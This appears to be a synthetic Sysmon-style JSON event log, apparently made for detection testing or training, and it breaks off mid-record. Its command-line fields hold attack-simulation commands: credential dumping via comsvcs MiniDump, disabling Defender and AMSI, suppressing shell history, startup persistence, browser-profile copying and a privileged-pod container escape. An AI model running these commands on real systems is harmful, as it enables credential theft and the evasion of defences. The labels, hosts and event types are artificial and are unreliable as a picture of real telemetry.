    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-47.martin-cervantes.com",
        "User": "daniel42",
        "ProcessID": 9728,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"echo $0\\nif $(env |grep \\\"SHELL\\\" >/dev/null); then env |grep \\\"SHELL\\\"; fi\\nif $(printenv SHELL >/dev/null); then printenv SHELL; fi\\n\",",
        "LogonID": 621233,
        "LogonGuid": "5d65f7fb-1f7f-44eb-8cee-4e4c3cf9b97d",
        "SourceProcessID": 6972,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\policy..exe",
        "DestinationProcessID": 4819,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\might..dll",
        "UtcTime": "2024-05-17T01:36:51.604493Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-01.everett.net",
        "User": "danielskrystal",
        "ProcessID": 5155,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)\\nif($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }\\nC:\\\\Windows\\\\System32\\\\rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll, MiniDump $id $env:TEMP\\\\svchost-exe.dmp full\\n\",",
        "LogonID": 849941,
        "LogonGuid": "f4d7b6f9-ed13-4faf-828a-9ba38b7c67b5",
        "SourceProcessID": 6169,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\system..exe",
        "DestinationProcessID": 3880,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\factor..dll",
        "UtcTime": "2024-05-17T01:36:51.605493Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-24.kirk.info",
        "User": "ortizbrad",
        "ProcessID": 9397,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"get-acl REGISTRY::HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\* |FL\\nget-acl REGISTRY::HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\#{weak_service_name} |FL\\n\",",
        "LogonID": 732857,
        "LogonGuid": "032d53ed-9250-4f18-ba9c-93e12de876a8",
        "SourceProcessID": 9334,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\environment..dll",
        "DestinationProcessID": 4303,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\use..exe",
        "UtcTime": "2024-05-17T01:36:51.605493Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-68.anderson-crane.com",
        "User": "psmith",
        "ProcessID": 5316,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"touch -acmr #{reference_file_path} #{target_file_path}\\n\",",
        "LogonID": 947236,
        "LogonGuid": "3ac582e3-cfa9-4227-adad-3ccdfaed52d9",
        "SourceProcessID": 3616,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\she..exe",
        "DestinationProcessID": 8129,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\evidence..dll",
        "UtcTime": "2024-05-17T01:36:51.605493Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "db-91.hammond.org",
        "User": "sarahall",
        "ProcessID": 7111,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"REG ADD \\\"HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\SafeBoot\\\\Minimal\\\\AtomicSafeMode\\\" /VE /T REG_SZ /F /D \\\"Service\\\"\\n\",",
        "LogonID": 528420,
        "LogonGuid": "be657a1c-3928-4056-9ee0-0fa3e45bb18d",
        "SourceProcessID": 6565,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\join..exe",
        "DestinationProcessID": 5470,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\among..exe",
        "UtcTime": "2024-05-17T01:36:51.605493Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "web-32.wolfe.com",
        "User": "zrivera",
        "ProcessID": 6213,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"& \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\Backstab64.exe\\\" -k -n #{process_name}\\n\",",
        "LogonID": 840932,
        "LogonGuid": "7be87eda-f638-4162-a039-47ef434771fd",
        "SourceProcessID": 6775,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\recent..exe",
        "DestinationProcessID": 9167,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\marriage..dll",
        "UtcTime": "2024-05-17T01:36:51.606494Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-23.johnson.com",
        "User": "phyllisharris",
        "ProcessID": 2389,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"if [ \\\"$(uname)\\\" = 'FreeBSD' ]; then cmd=\\\"b64decode -r\\\"; else cmd=\\\"base64 -d\\\"; fi;\\ncat /tmp/encoded.dat | $cmd > /tmp/art.sh\\nchmod +x /tmp/art.sh\\n/tmp/art.sh\\n\",",
        "LogonID": 989653,
        "LogonGuid": "f6ef5a6b-20bb-4197-8127-9fcb0ed0a649",
        "SourceProcessID": 3168,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\card..dll",
        "DestinationProcessID": 4348,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\peace..exe",
        "UtcTime": "2024-05-17T01:36:51.606494Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-60.mccoy-adams.net",
        "User": "cwalters",
        "ProcessID": 8162,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"net.exe start >> #{output_file}\\n\",",
        "LogonID": 484008,
        "LogonGuid": "757d76f4-f220-49a3-ac5a-d593bf162766",
        "SourceProcessID": 2944,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\population..dll",
        "DestinationProcessID": 8673,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\become..dll",
        "UtcTime": "2024-05-17T01:36:51.606494Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-31.ellis.com",
        "User": "danielle03",
        "ProcessID": 4760,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"FILE=`find ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist -type f | head -1`\\nif [ -z \\\"${FILE}\\\" ] ; then echo \\\"No loginwindow plist file found\\\" && exit 1 ; fi\\necho save backup copy to /tmp/\\ncp ${FILE} /tmp/t1547007_loginwindow-backup.plist\\necho before\\nplutil -p ${FILE}\\necho overwriting...\\n#{exe_path} ${FILE} && echo after && plutil -p ${FILE}\\n\",",
        "LogonID": 904993,
        "LogonGuid": "127f43ab-a4e6-4257-b489-f34e5ed17bea",
        "SourceProcessID": 4590,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\name..dll",
        "DestinationProcessID": 4301,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\decide..exe",
        "UtcTime": "2024-05-17T01:36:51.606494Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "web-58.pena.biz",
        "User": "crystalcook",
        "ProcessID": 8950,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"chmod +x #{autosuid}\\nbash #{autosuid}\\n\",",
        "LogonID": 804593,
        "LogonGuid": "52aa0d53-77ef-4ea4-8f8d-56d0e5bcb342",
        "SourceProcessID": 4557,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\first..dll",
        "DestinationProcessID": 1725,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\science..dll",
        "UtcTime": "2024-05-17T01:36:51.606494Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-79.cole-villegas.com",
        "User": "christopherwebb",
        "ProcessID": 2707,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"set +o history\\n\",",
        "LogonID": 173946,
        "LogonGuid": "abf35a94-739e-4c2d-a32e-b059bbbacef2",
        "SourceProcessID": 4404,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\only..dll",
        "DestinationProcessID": 6445,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\successful..exe",
        "UtcTime": "2024-05-17T01:36:51.607496Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-02.morrow.org",
        "User": "masonkatherine",
        "ProcessID": 2074,
        "ProcessName": "nc.exe",
        "CommandLine": "\"reg add HKLM64\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f\\nreg add HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f\\n\",",
        "LogonID": 388265,
        "LogonGuid": "9ac494f9-8f31-43ae-984d-31d3e8d42b81",
        "SourceProcessID": 2319,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\later..exe",
        "DestinationProcessID": 4590,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\this..dll",
        "UtcTime": "2024-05-17T01:36:51.607496Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-85.chavez.com",
        "User": "elainecraig",
        "ProcessID": 1998,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"sudo insmod #{module_path}\\n\",",
        "LogonID": 363601,
        "LogonGuid": "bd64195d-188b-45b1-bdc8-e922e7aa01b2",
        "SourceProcessID": 7678,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\organization..exe",
        "DestinationProcessID": 2785,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\Congress..dll",
        "UtcTime": "2024-05-17T01:36:51.607496Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "email-91.smith.org",
        "User": "jacoblee",
        "ProcessID": 2039,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"Copy-Item \\\"$PathToAtomicsFolder\\\\T1547.001\\\\src\\\\batstartup.bat\\\" \\\"$env:APPDATA\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\batstartup.bat\\\"\\nCopy-Item \\\"$PathToAtomicsFolder\\\\T1547.001\\\\src\\\\batstartup.bat\\\" \\\"C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp\\\\batstartup.bat\\\"\\nStart-Process \\\"$env:APPDATA\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\batstartup.bat\\\"\\nStart-Process \\\"C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp\\\\batstartup.bat\\\"\\n\",",
        "LogonID": 975872,
        "LogonGuid": "f64531a1-b1a3-45c2-b25c-a61e4229ed84",
        "SourceProcessID": 8866,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\yeah..dll",
        "DestinationProcessID": 7512,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\white..dll",
        "UtcTime": "2024-05-17T01:36:51.607496Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-93.pham-yates.org",
        "User": "zvazquez",
        "ProcessID": 6730,
        "ProcessName": "malware.exe",
        "CommandLine": "\"FILE=`find ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist -type f | head -1`\\nif [ -z \\\"${FILE}\\\" ] ; then echo \\\"No loginwindow plist file found\\\" && exit 1 ; fi\\necho save backup copy to /tmp/\\ncp ${FILE} /tmp/t1547007_loginwindow-backup.plist\\necho before\\nplutil -p ${FILE}\\necho overwriting...\\n#{exe_path} ${FILE} && echo after && plutil -p ${FILE}\\n\",",
        "LogonID": 979400,
        "LogonGuid": "2515f8f0-ea10-4308-a9db-949ff7236a45",
        "SourceProcessID": 8865,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\campaign..dll",
        "DestinationProcessID": 3554,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\offer..dll",
        "UtcTime": "2024-05-17T01:36:51.608491Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-76.irwin.org",
        "User": "nelsonanthony",
        "ProcessID": 2434,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"& \\\"PathToAtomicsFolder\\\\T1090.003\\\\src\\\\Psiphon.bat\\\"\\n\",",
        "LogonID": 453186,
        "LogonGuid": "c1b5f70b-7571-4649-ae08-68e8fc21a047",
        "SourceProcessID": 5627,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\particular..exe",
        "DestinationProcessID": 9836,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\offer..dll",
        "UtcTime": "2024-05-17T01:36:51.608491Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-67.morgan.com",
        "User": "jacobbranch",
        "ProcessID": 7167,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop\",",
        "LogonID": 964072,
        "LogonGuid": "0bf6f2af-4999-4564-b961-4d03455ac590",
        "SourceProcessID": 1417,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\answer..dll",
        "DestinationProcessID": 9405,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\foreign..exe",
        "UtcTime": "2024-05-17T01:36:51.608491Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-92.chavez.com",
        "User": "pkelly",
        "ProcessID": 8806,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"Get-WMIObject Win32_PnPEntity | Format-Table Name, Description, Manufacturer > $env:TEMP\\\\T1120_collection.txt\\n$Space,$Heading,$Break,$Data = Get-Content $env:TEMP\\\\T1120_collection.txt\\n@($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne \\\"\\\" } |Set-Content $env:TEMP\\\\T1120_collection.txt\",",
        "LogonID": 659134,
        "LogonGuid": "784f0342-e0b9-44a6-8f82-d9883be9ff69",
        "SourceProcessID": 2951,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\well..dll",
        "DestinationProcessID": 3247,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\be..dll",
        "UtcTime": "2024-05-17T01:36:51.608491Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-61.hill.com",
        "User": "duarteemily",
        "ProcessID": 1480,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"get-localgroup\\nGet-LocalGroupMember -Name \\\"Administrators\\\"\\n\",",
        "LogonID": 406686,
        "LogonGuid": "0d031b6d-c0c9-43c5-bc09-5093e1a41dd7",
        "SourceProcessID": 4784,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\throw..dll",
        "DestinationProcessID": 4811,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\among..exe",
        "UtcTime": "2024-05-17T01:36:51.608491Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-87.thornton-pierce.biz",
        "User": "wpatton",
        "ProcessID": 7343,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"echo $HISTSIZE\\nexport HISTSIZE=0\\nif [ $(echo $HISTSIZE) -eq 0 ]; then echo \\\"\\\\$HISTSIZE is zero\\\"; fi\\n# -> $HISTSIZE is zero\\n\",",
        "LogonID": 667443,
        "LogonGuid": "c237f4a9-d7d8-403f-bad8-b425d48663d1",
        "SourceProcessID": 1840,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\serve..exe",
        "DestinationProcessID": 7434,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\decade..dll",
        "UtcTime": "2024-05-17T01:36:51.609494Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-63.schneider.biz",
        "User": "douglasjeffery",
        "ProcessID": 7934,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist\\n\",",
        "LogonID": 825181,
        "LogonGuid": "ad545c64-4d1c-4845-aa31-232613fcdfcc",
        "SourceProcessID": 6621,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\system..dll",
        "DestinationProcessID": 2575,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\development..dll",
        "UtcTime": "2024-05-17T01:36:51.609494Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-40.lowe.biz",
        "User": "clarkelizabeth",
        "ProcessID": 6451,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"cd #{folder_path}; split -b 5000000 #{file_name}\\nls -l #{folder_path}\\n\",",
        "LogonID": 922992,
        "LogonGuid": "7cd76fd2-ed7b-4b49-8391-2a2313b49a44",
        "SourceProcessID": 5783,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\evidence..dll",
        "DestinationProcessID": 7187,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\military..exe",
        "UtcTime": "2024-05-17T01:36:51.609494Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-95.green.com",
        "User": "csanchez",
        "ProcessID": 6494,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"start \\\"\\\" #{browser} --headless --disable-gpu https://mockbin.org/bin/#{bin_id}\\n\",",
        "LogonID": 885140,
        "LogonGuid": "6a8bebed-c450-4981-b694-9ed95c53145a",
        "SourceProcessID": 8641,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\after..exe",
        "DestinationProcessID": 4020,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\science..dll",
        "UtcTime": "2024-05-17T01:36:51.609494Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-25.lee.net",
        "User": "laurachang",
        "ProcessID": 7537,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"ps >> #{output_file}\\nps aux >> #{output_file}\\n\",",
        "LogonID": 383668,
        "LogonGuid": "6850f50c-d7a4-4b45-a39e-e04883521e5d",
        "SourceProcessID": 3747,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\white..exe",
        "DestinationProcessID": 6046,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\enter..dll",
        "UtcTime": "2024-05-17T01:36:51.610496Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-47.farmer-wolf.com",
        "User": "vsalazar",
        "ProcessID": 3351,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"chown -R #{owner}:#{group} #{file_or_folder}\\n\",",
        "LogonID": 600072,
        "LogonGuid": "91b69499-89dc-4859-9d50-607cf61dfde0",
        "SourceProcessID": 4441,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\station..exe",
        "DestinationProcessID": 3881,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\ability..dll",
        "UtcTime": "2024-05-17T01:36:51.610496Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-46.sanders.biz",
        "User": "frank91",
        "ProcessID": 9883,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"reg add \\\"HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\WindowsUpdate\\\\AU\\\" /v \\\"AUOptions\\\" /t REG_DWORD /d 2 /f\\n\",",
        "LogonID": 764720,
        "LogonGuid": "75152d16-e35a-4c4f-bfa4-9abfd83c5c34",
        "SourceProcessID": 9832,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\country..dll",
        "DestinationProcessID": 5423,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\land..dll",
        "UtcTime": "2024-05-17T01:36:51.610496Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-33.gomez.com",
        "User": "robertwatson",
        "ProcessID": 1707,
        "ProcessName": "nc.exe",
        "CommandLine": "\"Remove-Item -Path \\\"HKLM:\\\\SOFTWARE\\\\Microsoft\\\\AMSI\\\\Providers\\\\{2781761E-28E0-4109-99FE-B9D127C57AFE}\\\" -Recurse\\n\",",
        "LogonID": 453244,
        "LogonGuid": "520fb5b4-dc66-4b87-82eb-d4da86926057",
        "SourceProcessID": 6940,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\leave..dll",
        "DestinationProcessID": 3411,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\hotel..exe",
        "UtcTime": "2024-05-17T01:36:51.610496Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-30.rodriguez-hughes.com",
        "User": "douglaswebb",
        "ProcessID": 2010,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"echo T1486 - Purelocker Ransom Note > %USERPROFILE%\\\\Desktop\\\\YOUR_FILES.txt\\n\",",
        "LogonID": 736900,
        "LogonGuid": "b5692ceb-9fd8-4cd7-92a6-c9ca02f3e356",
        "SourceProcessID": 3299,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\point..exe",
        "DestinationProcessID": 4699,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\join..dll",
        "UtcTime": "2024-05-17T01:36:51.610496Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-72.jackson.com",
        "User": "stacey56",
        "ProcessID": 7898,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"rundll32.exe url.dll,OpenURL \\\"PathToAtomicsFolder\\\\T1218.011\\\\src\\\\index.hta\\\"\\nrundll32.exe URL.dll,FileProtocolHandler \\\"PathToAtomicsFolder\\\\T1218.011\\\\src\\\\akteullen.vbs\\\"\\n\",",
        "LogonID": 611813,
        "LogonGuid": "5760824d-0dfd-4487-bc54-20b7a69fdc5a",
        "SourceProcessID": 4079,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\member..dll",
        "DestinationProcessID": 3338,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\personal..dll",
        "UtcTime": "2024-05-17T01:36:51.611492Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-44.austin-kirk.org",
        "User": "emilyhill",
        "ProcessID": 1983,
        "ProcessName": "malware.exe",
        "CommandLine": "\"kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=Never -ti --rm --image alpine --overrides '{\\\"spec\\\":{\\\"hostPID\\\": true, \\\"containers\\\":[{\\\"name\\\":\\\"1\\\",\\\"image\\\":\\\"alpine\\\",\\\"command\\\":[\\\"nsenter\\\",\\\"--mount=/proc/1/ns/mnt\\\",\\\"--\\\",\\\"/bin/bash\\\"],\\\"stdin\\\": true,\\\"tty\\\":true,\\\"securityContext\\\":{\\\"privileged\\\":true}}]}}'\\n\",",
        "LogonID": 638044,
        "LogonGuid": "a8022dba-9db3-4eb7-9bce-912c4363799d",
        "SourceProcessID": 5473,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\hold..dll",
        "DestinationProcessID": 5601,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\foreign..exe",
        "UtcTime": "2024-05-17T01:36:51.611492Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-46.martin.com",
        "User": "whiteruth",
        "ProcessID": 1231,
        "ProcessName": "nc.exe",
        "CommandLine": "\"$PathToAtomicsFolder\\\\T1055\\\\bin\\\\x64\\\\EtwpCreateEtwThread.exe -debug\\n\",",
        "LogonID": 703336,
        "LogonGuid": "fe60ff40-c093-4759-a37d-09fffac5fcf1",
        "SourceProcessID": 9305,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\end..exe",
        "DestinationProcessID": 5800,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\five..dll",
        "UtcTime": "2024-05-17T01:36:51.611492Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-76.barry-graham.com",
        "User": "joseph66",
        "ProcessID": 4683,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"TEST=$(echo $HISTFILESIZE)\\necho $HISTFILESIZE\\nexport HISTFILESIZE=0\\nif [ $(echo $HISTFILESIZE) -eq 0 ]; then echo \\\"\\\\$HISTFILESIZE is zero\\\"; fi\\n# -> $HISTFILESIZE is zero\\n\",",
        "LogonID": 824451,
        "LogonGuid": "5d03a48e-50d1-4924-a1a5-94ad09d3fb34",
        "SourceProcessID": 5307,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\throughout..exe",
        "DestinationProcessID": 3145,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\simply..exe",
        "UtcTime": "2024-05-17T01:36:51.611492Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-62.ferguson.com",
        "User": "mitchell95",
        "ProcessID": 9128,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"Start-Process \\\"#{exe_binary}\\\"\\nStart-Sleep -Seconds 7\\nGet-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force\",",
        "LogonID": 298418,
        "LogonGuid": "f3220a70-59e3-4783-be3e-d91d91da7a6d",
        "SourceProcessID": 9187,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\seven..exe",
        "DestinationProcessID": 9907,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\professor..exe",
        "UtcTime": "2024-05-17T01:36:51.611492Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-48.robbins.com",
        "User": "swansonkimberly",
        "ProcessID": 6255,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"\\\"#{exe_binary}\\\"\\n\",",
        "LogonID": 846754,
        "LogonGuid": "2f27b83a-5bbe-4b39-bb85-ab026b8517e1",
        "SourceProcessID": 6710,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\everything..exe",
        "DestinationProcessID": 3494,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\home..dll",
        "UtcTime": "2024-05-17T01:36:51.611492Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-21.gonzalez-griffin.com",
        "User": "keithlambert",
        "ProcessID": 9075,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"wmic cpu get name\\nwmic MEMPHYSICAL get MaxCapacity\\nwmic baseboard get product\\nwmic baseboard get version\\nwmic bios get SMBIOSBIOSVersion\\nwmic path win32_VideoController get name\\nwmic path win32_VideoController get DriverVersion\\nwmic path win32_VideoController get VideoModeDescription\\nwmic OS get Caption,OSArchitecture,Version\\nwmic DISKDRIVE get Caption\\nGet-WmiObject win32_bios\\n\",",
        "LogonID": 394784,
        "LogonGuid": "f97fc01e-6995-44a7-8caa-b721ccb83546",
        "SourceProcessID": 7027,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\opportunity..exe",
        "DestinationProcessID": 4694,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\imagine..dll",
        "UtcTime": "2024-05-17T01:36:51.611492Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-98.jones.com",
        "User": "daisymiles",
        "ProcessID": 5661,
        "ProcessName": "nc.exe",
        "CommandLine": "\"Copy-Item \\\"$env:APPDATA\\\\Mozilla\\\\Firefox\\\\Profiles\\\\\\\" -Destination \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\" -Force -Recurse\\n\",",
        "LogonID": 578550,
        "LogonGuid": "f256e887-776c-4ad8-8cc2-2742f497fa1a",
        "SourceProcessID": 4460,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\school..dll",
        "DestinationProcessID": 2153,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\be..exe",
        "UtcTime": "2024-05-17T01:36:51.613000Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-75.chambers.biz",
        "User": "tommcintosh",
        "ProcessID": 7961,
        "ProcessName": "rundll32.exe",
